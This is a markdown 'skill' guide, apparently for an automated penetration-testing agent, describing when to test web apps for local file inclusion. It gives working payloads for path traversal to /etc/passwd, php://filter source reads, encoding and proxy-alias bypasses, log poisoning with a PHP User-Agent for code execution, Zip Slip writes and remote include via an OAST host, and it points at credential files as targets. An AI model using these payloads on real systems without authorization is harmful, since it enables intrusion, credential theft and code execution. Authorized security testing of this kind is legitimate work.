# lfi — when to use

## Trigger signals (dispatch this skill the moment you observe…)

- If you see a parameter whose **value looks like a filename, path, or extension** — `page=about`, `file=report.pdf`, `template=default.tpl`, `lang=en`, `view=home`, `doc=invoice`, `include=header`, `path=/data/x`, `theme=dark`, `download=manual` → this skill applies. The name and the value both smell like a filesystem reference.
- If you see a value that ends in or contains a **file extension** (`.php`, `.html`, `.tpl`, `.inc`, `.log`, `.xml`, `.pdf`, `.txt`) being passed back into the app via a query/body/cookie param → strong file-inclusion candidate.
- If you see a **page that swaps content based on a parameter** (same URL skeleton, different body chunk per value of `page=`/`section=`/`module=`) — i.e. a poor-man's router that loads a fragment by name → dispatch here.
- If you see **`.php` appended automatically** to your input (you send `page=foo` and the error mentions `foo.php`), or you can strip it with a null byte / wrapper → classic PHP LFI shape.
- If you see an **error string that leaks a real filesystem path**: `failed to open stream: No such file or directory in /var/www/...`, `include(): Failed opening`, `fopen(...): No such file`, `java.io.FileNotFoundException`, `System.IO.FileNotFoundException: Could not find file 'C:\...'`, `No such file or directory`, `ENOENT: no such file or directory, open '...'` → the app is concatenating your input into a path. Dispatch immediately.
- If you see a **download/export/preview/attachment endpoint** that takes the filename in the URL: `/download?f=...`, `/export?file=...`, `/getImage?path=...`, `Content-Disposition: attachment; filename="<your input>"` → file-serving sink, test traversal here.
- If you see your traversal probe **change the response** — `../../etc/hosts` returns hostname-mapping text, or depth changes flip between 200-with-content and 404/500 → confirmed read primitive, this is the skill.
- If you see a **static file server / reverse-proxy fingerprint** (`Server: nginx`, `Server: Apache`) fronting an app, especially with `/static/`, `/assets/`, `/files/` prefixes → test for alias/`..;` normalization escapes here.
- If you see an **upload-then-extract or import feature** (upload a `.zip`/`.tar`, "Import backup", "Restore", "Bulk upload") → Zip Slip surface lives in this skill.
- If you see **`/proc/self/environ`, `/proc/self/cmdline`, log paths, or session files** become readable through a parameter → LFI confirmed, escalate within this skill.

## Use-case scenarios

- **Dynamic content routers.** Legacy and CMS-style apps that include a server-side file chosen by a query parameter (`?page=`, `?module=`, `?action=`, `?p=`). The fragment is loaded by name from disk; any traversal or wrapper that escapes the intended directory is in scope. This is the canonical LFI surface and the most common one on older PHP stacks.
- **File-serving endpoints.** Download/preview/thumbnail/report endpoints that take a filename or path and stream the bytes back. These give a pure *read* primitive — perfect for `/etc/passwd`, `.env`, `web.config`, app source, SSH keys, and cloud-credential files. The give-away is that the parameter directly names the resource being served.
- **Template/theme/locale selection.** `template=`, `theme=`, `skin=`, `lang=`, `locale=` parameters that resolve to a file on disk (`templates/<name>.tpl`, `lang/<name>.php`). User-controlled template resolution is both an LFI surface (read arbitrary file) and a potential SSTI/RCE bridge if the included file is then evaluated.
- **Document/asset pipelines.** Image renderers, PDF/office converters, thumbnailers, and report engines that accept a path or a source filename. They often run with broad filesystem access and join user input into a path with no normalization.
- **Reverse-proxy / static-handler boundaries.** Where nginx/Apache/a CDN sits in front of the app, the two layers disagree about decoding and normalization. The `alias`-without-trailing-slash bug and the `..;/` (semicolon path-segment) trick let `../` escape the served root. Worth probing whenever a static prefix is present.
- **Archive extraction / restore features.** Any feature that unpacks a user-supplied `.zip`/`.tar`/`.tgz`/`.7z` is a Zip Slip *write* surface — entries containing `../` or absolute paths land outside the extraction directory (overwrite a template, drop a webshell into a served dir).
- **RFI bridges.** Older PHP with `allow_url_include`/`allow_url_fopen`, or custom fetchers that include/eval a remote resource, turn a file parameter into remote code execution. The tell is that a `http://`/`ftp://` value in the param produces a fetch (use an OAST listener to confirm).
- **OS-unknown black-box.** When you don't yet know if the host is Linux or Windows, this skill is the right move precisely because it carries both path families (`/etc/passwd` vs `C:\Windows\win.ini`) and both separator styles.

## Concrete tells (request → response examples)

- **Baseline read confirm.**
  `GET /index.php?page=../../../../etc/passwd`
  → response body contains `root:x:0:0:root:/root:/bin/bash` (or any `name:x:UID:GID:...:/path:/shell` lines). Confirms Unix file read.
- **Windows variant when Unix fails.**
  `GET /view?file=..\..\..\..\Windows\win.ini`
  → body contains `[fonts]` / `[extensions]` / `for 16-bit app support`. Confirms Windows file read.
- **PHP source disclosure via wrapper.**
  `GET /index.php?page=php://filter/convert.base64-encode/resource=index`
  → response is a long base64 blob that decodes to `<?php ...`. Confirms LFI with wrapper support and lets you read source without executing it.
- **Auto-appended extension tell.**
  Send `?page=foo` → error `failed to open stream: ... foo.php`. Now send `?page=php://filter/.../resource=config` → you read `config.php`. The appended `.php` in the error is the fingerprint.
- **Depth/normalization probe.**
  `?file=../../etc/hosts` vs `?file=etc/hosts` → former returns the hosts table (localhost mapping), latter 404/empty. The *difference between in-root and out-of-root* is the proof, not the content alone.
- **Encoding-bypass tell.**
  Plain `../` is filtered (returns "invalid path") but `%2e%2e%2f`, `..%252f`, `....//`, or `..%c0%af` succeeds → input is filtered pre-decode and the WAF/router and the file API decode differently. Confirms an exploitable normalization gap.
- **Proxy alias escape.**
  `GET /static../etc/passwd` or `GET /assets/..;/..;/..;/etc/passwd` returns file content on an nginx box → `alias`/`..;` misconfiguration.
- **Log-poisoning escalation tell.**
  You can read `/var/log/apache2/access.log` via the param; you send a request with `User-Agent: <?php echo 'INJECT-OK'; ?>`; re-reading the log through the param now renders `INJECT-OK` (PHP executed) → LFI-to-RCE confirmed.
- **Zip Slip tell.**
  Upload an archive with an entry literally named `../../../../var/www/html/marker.txt`; afterward `GET /marker.txt` returns your marker content → write-outside-root confirmed.
- **RFI tell.**
  `?page=http://<your-oast-host>/p.txt` → your OAST listener logs an inbound HTTP fetch from the target → remote include is reachable.

## When NOT to use it / easily-confused-with

- **Reflected/echoed value, no file load → not LFI.** If your input only comes back in HTML/JS/attributes and is not used as a path, that is XSS, not file inclusion. The discriminator: does the value name a *resource on disk*, or does it land in the *output markup*?
- **Value evaluated as an expression → SSTI, not LFI.** If `name={{7*7}}` returns `49`, the parameter is being rendered by a template engine — route to SSTI. LFI is when a *file path* is chosen, not when an expression is computed. Note the overlap: a user-controlled *template name* that loads `<name>.tpl` is LFI; a user-controlled *template body/expression* is SSTI.
- **URL/host parameter that fetches a remote resource server-side → SSRF first.** `url=`, `target=`, `callback=`, `webhook=`, `proxy=` pointing at `http://` and used to make an outbound request is SSRF. It only becomes RFI when that fetched content is then *included/evaluated* as code. If the app just fetches and returns/parses it, that is SSRF (or XXE/redirect), not file inclusion.
- **Numeric/opaque-ID resource selection → IDOR, not traversal.** `?doc_id=1042` or `?file=8a3f-uuid` that maps an ID to a stored object (DB/object storage) is access-control / IDOR territory. Traversal needs the parameter to be (or accept) an actual path; if `../` is treated as a literal lookup key and 404s cleanly, it's not a filesystem sink.
- **Virtual/in-app paths that never touch the disk.** A "path" routed entirely inside the framework (DB-backed pages, S3 keys with strict prefixes) is a false positive. Confirm with a canonical small read (`/etc/hosts`) and an in-root control on the *same* endpoint before claiming LFI.
- **OS command in the value → command injection, not LFI.** If the parameter is concatenated into a shell command (`; id`, `$(...)`, `` `...` `` change the response), route to command injection. LFI is path resolution, not shell execution — even though both can end in RCE, the input grammar and skill differ.
- **SQLi-shaped errors.** A parameter that throws `SQL syntax`/`ORA-`/`SQLSTATE` errors on a quote is SQL injection, not a file path — don't misread a DB error for a filesystem error.
